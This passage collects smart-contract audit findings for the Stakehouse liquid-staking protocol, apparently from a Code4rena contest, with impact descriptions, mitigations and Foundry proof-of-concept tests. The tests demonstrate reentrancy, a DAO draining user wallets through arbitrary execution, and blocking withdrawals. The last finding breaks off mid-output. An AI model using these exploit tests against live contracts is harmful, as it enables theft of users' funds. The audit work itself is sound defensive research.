IOwnableSmartWallet(associatedSmartWallet).rawExecute(  _recipient,  "",  4 ether ); ```  which triggers reentrancy to withdraw the fund again before the public key is banned.  ```solidity receive() external payable {  if(!state) {   state = true;   this.withdraw("publicKeys1");  } } ```   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend ban the public key first then send the fund out, and use openzeppelin nonReentrant modifier to avoid reentrancy.  ```solidity  // update the mapping bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;  // refund 4 ether from smart wallet to node runner's EOA IOwnableSmartWallet(associatedSmartWallet).rawExecute(  _recipient,  "",  4 ether ); ```
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377   # Vulnerability details  ## Impact DAO or lsd network owner can swap node runner of the smart contract to their own eoa, allowing them to withdrawETH or claim rewards from node runner.   ## Proof of Concept there are no checks done when swapping the node runner whether there are funds in the smart contract that belongs to the node runner. Therefore, a malicious dao or lsd network owner can simply swap them out just right after the node runner has deposited 4 ether in the smart wallet.  place poc in LiquidStakingManager.sol  ```solidity     function testDaoCanTakeNodeRunner4ETH() public {         address nodeRunner = accountOne; vm.deal(nodeRunner, 4 ether);         address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);         address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);         address attacker = accountFour;           registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);          vm.startPrank(admin);         manager.rotateNodeRunnerOfSmartWallet(nodeRunner, attacker, true);          vm.stopPrank();          vm.startPrank(attacker);         emit log_uint(attacker.balance);         manager.withdrawETHForKnot(attacker,blsPubKeyOne);         emit log_uint(attacker.balance);         vm.stopPrank();     }  ```  ## Tools Used  forge  ## Recommended Mitigation Steps Send back outstanding ETH and rewards that belongs to node runner if swapping is needed. 
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L202 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L210 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L426 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L460 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L63   # Vulnerability details  ## Impact  Dao admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund via arbitrary execution.  ## Proof of Concept  After the Liquid Staking Manager.so is deployed via LSDNFactory::deployNewLiquidStakingDerivativeNetwork,  ```solidity /// @notice Deploys a new LSDN and the liquid staking manger required to manage the network /// @param _dao Address of the entity that will govern the liquid staking network /// @param _stakehouseTicker Liquid staking derivative network ticker (between 3-5 chars) function deployNewLiquidStakingDerivativeNetwork(  address _dao,  uint256 _optionalCommission,  bool _deployOptionalHouseGatekeeper,  string calldata _stakehouseTicker ) public returns (address) { ```  The dao address governance address (contract) has very high privilege.  The dao address can perform arbitrary execution by calling LiquidStakingManager.sol::executeAsSmartWallet  ```solidity /// @notice Enable operations proxied through DAO contract to another contract /// @param _nodeRunner Address of the node runner that created the wallet /// @param _to Address of the target contract /// @param _data Encoded data of the function call /// @param _value Total value attached to the transaction function executeAsSmartWallet(  address _nodeRunner,  address _to,  bytes calldata _data,  uint256 _value ) external payable onlyDAO {  address smartWallet = smartWalletOfNodeRunner[_nodeRunner];  require(smartWallet != address(0), "No wallet found");  IOwnableSmartWallet(smartWallet).execute(   _to,   _data,   _value  ); } ```  When a register a new node operator with 4 ETH by calling registerBLSPublicKeys:  ```solidity /// @notice register a node runner to LSD by creating a new smart wallet /// @param _blsPublicKeys list of BLS public keys /// @param _blsSignatures list of BLS signatures /// @param _eoaRepresentative EOA representative of wallet function registerBLSPublicKeys(  bytes[] calldata _blsPublicKeys,  bytes[] calldata _blsSignatures,  address _eoaRepresentative ) external payable nonReentrant { ```  the smart wallet created in the smart contract custody the 4 ETH.  ```solidity // create new wallet owned by liquid staking manager smartWallet = smartWalletFactory.createWallet(address(this)); emit SmartWalletCreated(smartWallet, msg.sender); ```  ```solidity {  // transfer ETH to smart wallet  (bool result,) = smartWallet.call{value: msg.value}("");  require(result, "Transfer failed");  emit WalletCredited(smartWallet, msg.value); } ```  but  Dao admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund in the smart wallet via arbitrary execution.  **As shown in POC:**  first we add this smart contract in LiquidStakingManager.t.sol  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12  ```solidity import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";  contract RugContract {      function receiveFund() external payable {      }      receive() external payable {} }  contract MockToken is ERC20 {      constructor()ERC20("A", "B") {         _mint(msg.sender, 10000 ether);     }  } ```  **We add the two POC,**   https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35  the first POC shows the admin can steal the ETH from the smart contract via arbrary execution.  ```solidity     function testDaoRugFund_Pull_ETH_POC() public {                  address user = vm.addr(21312);          bytes[] memory publicKeys = new bytes[](1);         publicKeys[0] = "publicKeys";          bytes[] memory signature = new bytes[](1);         signature[0] = "signature";          RugContract rug = new RugContract();          // user spends 4 ehter and register the key to become the public operator         vm.prank(user);         vm.deal(user, 4 ether);         manager.registerBLSPublicKeys{value: 4 ether}(             publicKeys,             signature,             user         );         address wallet = manager.smartWalletOfNodeRunner(user);         console.log("wallet ETH balance for user after registering");         console.log(wallet.balance);          // dao admin rug the user by withdraw the ETH via arbitrary execution.         vm.prank(admin);         bytes memory data = abi.encodeWithSelector(RugContract.receiveFund.selector, "");         manager.executeAsSmartWallet(             user,             address(rug),             data,             4 ether         );         console.log("wallet ETH balance for user after DAO admin rugging");         console.log(wallet.balance);      } ```  We run the test:  ```solidity forge test -vv --match testDaoRugFund_Pull_ETH_POC ```  the result is  ```solidity Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [PASS] testDaoRugFund_Pull_ETH_POC() (gas: 353826) Logs:   wallet ETH balance for user after registering   4000000000000000000   wallet ETH balance for user after DAO admin rugging   0  Test result: ok. 1 passed; 0 failed; finished in 13.63ms ```  the second POC shows the admin can steal the ERC20 token from the smart contract via arbrary execution.  ```solidity     function testDaoRugFund_Pull_ERC20_Token_POC() public {          address user = vm.addr(21312);          bytes[] memory publicKeys = new bytes[](1);         publicKeys[0] = "publicKeys";          bytes[] memory signature = new bytes[](1);         signature[0] = "signature";          RugContract rug = new RugContract();          vm.prank(user);         vm.deal(user, 4 ether);         manager.registerBLSPublicKeys{value: 4 ether}(             publicKeys,             signature,             user         );          address wallet = manager.smartWalletOfNodeRunner(user);         ERC20 token = new MockToken();         token.transfer(wallet, 100 ether);          console.log("wallet ERC20 token balance for user after registering");         console.log(token.balanceOf(wallet));          vm.prank(admin);         bytes memory data = abi.encodeWithSelector(IERC20.transfer.selector, address(rug), 100 ether);         manager.executeAsSmartWallet(             user,             address(token),             data,             0         );          console.log("wallet ERC20 token balance for dao rugging");         console.log(token.balanceOf(wallet));      } ```  We run the test:  ```solidity forge test -vv --match testDaoRugFund_Pull_ERC20_Token_POC ```  the running result is  ```solidity Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [PASS] testDaoRugFund_Pull_ERC20_Token_POC() (gas: 940775) Logs:   wallet ERC20 token balance for user after registering   100000000000000000000   wallet ERC20 token balance for dao rugging   0  Test result: ok. 1 passed; 0 failed; finished in 16.99ms ```   ## Tools Used  Manual Review, Foundry  ## Recommended Mitigation Steps  We recommend not give the dao admin the priviledge to perform arbitrary execution to access user's fund.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106   # Vulnerability details  ## Impact The `OwnableSmartWallet` contract employs a mechanism for the owner to approve addresses that can then claim ownership ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94)) of the contract.    The source code has a comment included which states that "Approval is revoked, in order to avoid unintended transfer allowance if this wallet ever returns to the previous owner" ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106)).    This means that when ownership is transferred from User A to User B, the approvals that User A has given should be revoked.    The existing code does not however revoke all approvals that User A has given. It only revokes one approval.    This can lead to unwanted transfers of ownership.    ## Proof of Concept 1. User A approves User B and User C to claim ownership 2. User B claims ownership first 3. Only User A's approval for User B is revoked, not however User A's approval for User C 4. User B transfers ownerhsip back to User A 5. Now User C can claim ownership even though this time User A has not approved User C  ## Tools Used VSCode  ## Recommended Mitigation Steps You should invalidate all approvals User A has given when another User becomes the owner of the OwnableSmartWallet.    Unfortunately you cannot use a statement like `delete _isTransferApproved[owner()]`.    So you would need an array that keeps track of approvals as pointed out in this StackExchange question: [https://ethereum.stackexchange.com/questions/15553/how-to-delete-a-mapping](https://ethereum.stackexchange.com/questions/15553/how-to-delete-a-mapping)   
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L95   # Vulnerability details  ## Impact The `GiantPoolBase.withdrawLPTokens` function ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69)) allows to withdraw LP tokens from a GiantPool by burning an equal amount of GiantLP.    This allows a user to handle the LP tokens directly without the need for a GiantPool as intermediary.    It is not checked however whether the LP tokens to be withdrawn were transferred to the GiantPool in exchange for staking ETH.    I.e. whether the LP token are of any value.    There are two issues associated with this behavior.    1. A malicious user can create and mint his own LP Token and send it to the GiantPool. Users that want to withdraw LP tokens from the GiantPool can then be tricked into withdrawing worthless attacker LP tokens, thereby burning their GiantLP tokens that are mapped 1:1 to  ETH. (-> loss of funds)    2. This can also mess up internal accounting logic. For every LP token that is owned by a GiantPool there should be a corresponding GiantLP token. Using the described behavior this ratio can be broken such that there are LP token owned by the GiantPool for which there is no GiantLP token. This means some LP token cannot be transferred from the GiantPool and there will always be some amount of LP token "stuck" in the GiantPool.    ## Proof of Concept 1. The attacker deploys his own LPToken contract and sends a huge amount of LP tokens to the GiantPool to pass the check in `GiantPoolBase._assertUserHasEnoughGiantLPToClaimVaultLP` ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L95](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L95)).  2. The attacker tricks Bob into withdrawing the malicious LP tokens from the GiantPool ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69)).  3. Bob's GiantLP tokens are burnt and he receives worthless LP tokens.  The same issue exists for the `GiantSavETHVaultPool.withdrawDETH` function.   But in this case, the victim must also provide a wrong savETHVault address which makes this issue less likely to be exploited.    ## Tools Used VSCode  ## Recommended Mitigation Steps The GiantPool should store information about which LP tokens it receives for staking ETH.  When calling the `GiantPoolBase.withdrawLPTokens` function it can then be checked if the LP tokens to be withdrawn were indeed transferred to the GiantPool in exchange for staking ETH.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L53   # Vulnerability details  ## Impact The `GiantPoolBase.withdrawETH` function requires that the amount to withdraw is at least as big as the `MIN_STAKING_AMOUNT` ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L53](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L53)).    This check does not serve any purpose and can actually cause the user problems when withdrawing his ETH.    ## Proof of Concept 1. Bob deposits ETH into the GiantPool with the `GiantPoolBase.depositETH` function.      The amount is equal to `MIN_STAKING_AMOUNT + 0.99 * MIN_STAKING_AMOUNT`. 2. Bob witdraws `MIN_STAKING_AMOUNT` ETH from the GiantPool.   3. Bob has `0.99 * MIN_STAKING_AMOUNT` ETH left in the GiantPool. This is a problem since he cannot withdraw this amount of ETH since it is smaller than `MIN_STAKING_AMOUNT`.      In order to withdraw his funds, Bob needs to first add funds to the GiantPool such that the deposited amount is big enough for withdrawal.  However this causes extra transaction fees to be paid (loss of funds) and causes a bad user experience.    ## Tools Used VSCode  ## Recommended Mitigation Steps The `require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");` statement should just be removed. It does not serve any purpose anyway.  
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L245   # Vulnerability details  ## Impact  If a user stakes some sETH, and after some time decides to unstake some amount of sETH, later s/he will not be qualified or be less qualified to claim ETH on the remaining staked sETH.  ## Proof of Concept  Suppose Alice stakes 5 sETH by calling `stake(...)`. https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L203 So, we will have:  -  `sETHUserClaimForKnot[BLS][Alice] = (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION`  - `sETHStakedBalanceForKnot[BLS][Alice] = 5 * 10^18`  - `sETHTotalStakeForKnot[BLS] += 5 * 10^18`  Later, Alice decides to unstake 3 sETH by calling `unstake(...)`. https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L245  So, all ETH owed to Alice will be paid: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L257  Then, we will have:  -  `sETHUserClaimForKnot[BLS][Alice] = (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION`  - `sETHStakedBalanceForKnot[BLS][Alice] = 2 * 10^18`  - `sETHTotalStakeForKnot[BLS] -= 3 * 10^18`  It is clear that the mapping `sETHStakedBalanceForKnot` is decreased as expected, but the mapping `sETHUserClaimForKnot` is not changed. In other words, the mapping `sETHUserClaimForKnot` is still holding the claimed amount based on the time 5 sETH were staked.  If, after some time, the ETH is accumulated per free floating share for the BLS public key that Alice was staking for, Alice will be qualified to some more ETH to claim (because she has still 2 sETH staked).   If Alice unstakes by calling `unstake(...)` or claim ETH by calling `claimAsStaker(...)`, in both calls, the function `calculateUnclaimedFreeFloatingETHShare` will be called to calculate the amount of unclaimed ETH: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L652  In this function, we will have:  - `stakedBal = sETHStakedBalanceForKnot[BLS][Alice]` = 2 * 10^18  - `userShare = (newAccumulatedETHPerShare * stakedBal) / PRECISION`   The return value which is unclaimed ETH will be: ``` userShare - sETHUserClaimForKnot[BLS][Alice] =  (newAccumulatedETHPerShare * 2 * 10^18) / PRECISION - (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION ```  This return value is not correct (it is highly possible to be smaller than 0, and as a result Alice can not claim anything), because the claimed ETH is still based on the time when 5 sETH were staked, not on the time when 2 sETH were remaining/staked.  The vulnerability is that during unstaking, the mapping `sETHUserClaimForKnot` is not updated to the correct value. In other words, this mapping is updated in `_claimAsStaker`, but it is updated based on 5 sETH staked, later when 3 sETH are unstaked, this mapping should be again updated based on the remaing sETH (which is 2 sETH).  As a result, Alice can not claim ETH or she will qualify for less amount.  ## Tools Used  ## Recommended Mitigation Steps The following line should be added on line 274: ``` sETHUserClaimForKnot[_blsPubKey][msg.sender] =                 (accumulatedETHPerShare * sETHStakedBalanceForKnot[_blsPubKey][msg.sender]) / PRECISION ```  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L274
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126   # Vulnerability details  ## Impact  Both giant pools are affected: 1. GiantSavETHVaultPool 2. bringUnusedETHBackIntoGiantPool   The giant pools have a `bringUnusedETHBackIntoGiantPool` function that calls the vaults to send back any unused ETH. Currently, any call to this function will revert. Unused ETH will not be sent to the giant pools and will stay in the vaults.  This causes an insolvency issue when many users want to withdraw ETH and there is not enough liquidity inside the giant pools.  ## Proof of Concept  `bringUnusedETHBackIntoGiantPool` calls the vaults to receive ETH: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137 ```     function bringUnusedETHBackIntoGiantPool(         address[] calldata _savETHVaults,         LPToken[][] calldata _lpTokens,         uint256[][] calldata _amounts     ) external {         uint256 numOfVaults = _savETHVaults.length;         require(numOfVaults > 0, "Empty arrays");         require(numOfVaults == _lpTokens.length, "Inconsistent arrays");         require(numOfVaults == _amounts.length, "Inconsistent arrays");         for (uint256 i; i < numOfVaults; ++i) {             SavETHVault vault = SavETHVault(_savETHVaults[i]);             for (uint256 j; j < _lpTokens[i].length; ++j) {                 require(                     vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,                     "ETH is either staked or derivatives minted"                 );             }             vault.burnLPTokens(_lpTokens[i], _amounts[i]);         }     } ```  the vaults go through a process of burning the `_lpTokens` and sending the caller giant pool ETH.  `burnLPToken` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126 ```     function burnLPToken(LPToken _lpToken, uint256 _amount) public nonReentrant returns (uint256) {         /// .....         (bool result,) = msg.sender.call{value: _amount}("");         // .....     } ```  Giant pools do not have a `fallback` or `receive` function. ETH cannot be sent to them  additionally, there is no accounting of `idleETH`, which should be increased with the received ETH in order to facilitate withdraws  ## Tools Used  VS Code  ## Recommended Mitigation Steps  1. Add a `fallback` or `receive` function to the pools. 2. `idleETH` should be increased with the received ETH 
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76   # Vulnerability details  ## Impact  It is possible to rotate `LPTokens` to a banned BLS public key. This is not a safe action, because it can result in insolvency of the project (specially if the banned BLS public key was malicious).  ## Proof of Concept  When a user deposits ETH for staking by calling `depositETHForStaking`, the manager checks whether the provided BLS public key is banned or not. `require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, "BLS public key is banned or not a part of LSD network");` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L113  If it is not banned the `LPToken` related to that BLS public key will be minted to the caller, so the number of `LPToken` related to that BLS public key will be increased.  https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/liquid-staking/ETHPoolLPFactory.sol#L125  If it is banned, it will not be possible to stake to this BLS public key, so the number of `LPToken` will not be increased. But the issue is that it is still possible to increase the `LPToken` of this BLS public key through rotating `LPToken`.   In other words, a malicious user can call `rotateLPTokens`, so that the `_oldLPToken` will be migrated to `_newLPToken` which is equal to the `LPToken` related to the banned BLS public key.  In summary, the vulnerability is that during rorating `LPTokens`, it is not checked that the `_newLPToken` is related to a banned BLS public key or not.  ## Tools Used  ## Recommended Mitigation Steps The following line should be added to function `rotateLPTokens(...)`: `require(liquidStakingNetworkManager.isBLSPublicKeyBanned(blsPublicKeyOfNewKnot ) == false, "BLS public key is banned or not a part of LSD network");` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L96   # Vulnerability details  ## Impact  A hacker can prevent users from withdrawing dETH or LPTokens in giant pools.  This bug causes a revert in: 1. `WithdrawLP` - `GiantMevAndFeesPool` 2. `WithdrawLP` - `GiantSavETHVaultPool` 3. `WithdrawDETH` - `GiantSavETHVaultPool`  A hacker can prevent a user from receiving dETH when users are eligible and guaranteed to receive it through their stake.  This causes a liquidity crunch as the only funds that are possible to withdraw are ETH. There is not enough ETH in the giant pools to facilitate a large withdraw as ETH is staked for LPTokens and dETH.  The giant pools will become insolvent to returning ETH, dETH or vault LPTokens.  ## Proof of Concept  Both `WithdrawLP` and `WithdrawDETH` act in a similar way: 1. loop LPtokens received for withdraw 2. Check user has enough Giant LP tokens to burn and pool has enough vault LP to give. 3. Check that a day has passed since user has interacted with Giant LP Token 4. burn tokens 5. send tokens  Example of `WithdrawDETH`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66 ```     function withdrawDETH(         address[] calldata _savETHVaults,         LPToken[][] calldata _lpTokens,         uint256[][] calldata _amounts     ) external {         uint256 numOfVaults = _savETHVaults.length;         require(numOfVaults > 0, "Empty arrays");         require(numOfVaults == _lpTokens.length, "Inconsistent arrays");         require(numOfVaults == _amounts.length, "Inconsistent arrays");          // Firstly capture current dETH balance and see how much has been deposited after the loop         uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));         for (uint256 i; i < numOfVaults; ++i) {             SavETHVault vault = SavETHVault(_savETHVaults[i]);              // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user             for (uint256 j; j < _lpTokens[i].length; ++j) {                 LPToken token = _lpTokens[i][j];                 uint256 amount = _amounts[i][j];                  // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP                 _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);                  require(vault.isDETHReadyForWithdrawal(address(token)), "dETH is not ready for withdrawal");                  // Giant LP is burned 1:1 with LPs from sub-networks                 require(lpTokenETH.balanceOf(msg.sender) >= amount, "User does not own enough LP");                  // Burn giant LP from user before sending them dETH                 lpTokenETH.burn(msg.sender, amount);                  emit LPBurnedForDETH(address(token), msg.sender, amount);             }              // Ask             vault.burnLPTokens(_lpTokens[i], _amounts[i]);         }          // Calculate how much dETH has been received from burning         dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;          // Send giant LP holder dETH owed         getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);     } ```  The bug is in `_assertUserHasEnoughGiantLPToClaimVaultLP` in the last require that checks that a day has passed since the user has interacted with Giant LP Token: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L93 ```     function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {         require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");         require(_token.balanceOf(address(this)) >= _amount, "Pool does not own specified LP");         require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, "Too new");     } ```  The condition `lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp` can be set to fail by the hacker. The hacker  transfers 0 `lpTokenETH` tokens to  `msg.sender`. This transfer will update the `lastInteractedTimestamp` to now.  The above can be done once a day or on-demand by front-running the withdraw commands.  `_afterTokenTransfer` in `GiantLP.sol`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43 ```     function _afterTokenTransfer(address _from, address _to, uint256 _amount) internal override {         lastInteractedTimestamp[_from] = block.timestamp;         lastInteractedTimestamp[_to] = block.timestamp;         if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).afterTokenTransfer(_from, _to, _amount);     } ``` ### Foundry POC  The POC will show how a hacker prevents a user from receiving dETH although they are eligible to receive it.  Add the following test to `GiantPools.t.sol`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/GiantPools.t.sol#L118 ```     function testPreventWithdraw() public {         // Set up users and ETH         address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);         address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);         address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);          // Register BLS key         registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);          // Deposit 24 ETH into giant savETH         vm.prank(savETHUser);         giantSavETHPool.depositETH{value: 24 ether}(24 ether);         assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);         assertEq(address(giantSavETHPool).balance, 24 ether);          // Deploy 24 ETH from giant LP into savETH pool of LSDN instance         bytes[][] memory blsKeysForVaults = new bytes[][](1);         blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);          uint256[][] memory stakeAmountsForVaults = new uint256[][](1);         stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);          giantSavETHPool.batchDepositETHForStaking(             getAddressArrayFromValues(address(manager.savETHVault())),             getUint256ArrayFromValues(24 ether),             blsKeysForVaults,             stakeAmountsForVaults         );         assertEq(address(manager.savETHVault()).balance, 24 ether);          // Deposit 4 ETH into giant fees and mev         vm.startPrank(feesAndMevUserOne);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);         vm.stopPrank();          assertEq(address(giantFeesAndMevPool).balance, 4 ether);         stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);         giantFeesAndMevPool.batchDepositETHForStaking(             getAddressArrayFromValues(address(manager.stakingFundsVault())),             getUint256ArrayFromValues(4 ether),             blsKeysForVaults,             stakeAmountsForVaults         );          // Ensure we can stake and mint derivatives         stakeAndMintDerivativesSingleKey(blsPubKeyOne);          IERC20 dETHToken = savETHVault.dETHToken();          vm.startPrank(accountFive);         dETHToken.transfer(address(savETHVault.saveETHRegistry()), 24 ether);         vm.stopPrank();          LPToken[] memory tokens = new LPToken[](1);         tokens[0] = savETHVault.lpTokenForKnot(blsPubKeyOne);          LPToken[][] memory allTokens = new LPToken[][](1);         allTokens[0] = tokens;          stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);          // User will not have any dETH to start         assertEq(dETHToken.balanceOf(savETHUser), 0);          // Warp ahead -> savETHUser eligible to dETH         vm.warp(block.timestamp + 2 days);          // Send 0 tokens to savETHUser so he cannot withdrawDETH         address hacker = address(0xdeadbeef);         vm.startPrank(hacker);         giantSavETHPool.lpTokenETH().transfer(savETHUser, 0);         vm.stopPrank();         address[] memory addresses = getAddressArrayFromValues(address(manager.savETHVault()));          vm.startPrank(savETHUser);         // Validate withdrawDETH will revert           vm.expectRevert("Too new");         giantSavETHPool.withdrawDETH(addresses, allTokens, stakeAmountsForVaults);         vm.stopPrank();         } ```  To run the POC execute:  `yarn test -m "PreventWithdraw" -v`  Expected output:  ``` Running 1 test for test/foundry/GiantPools.t.sol:GiantPoolTests [PASS] testPreventWithdraw() (gas: 3132637) Test result: 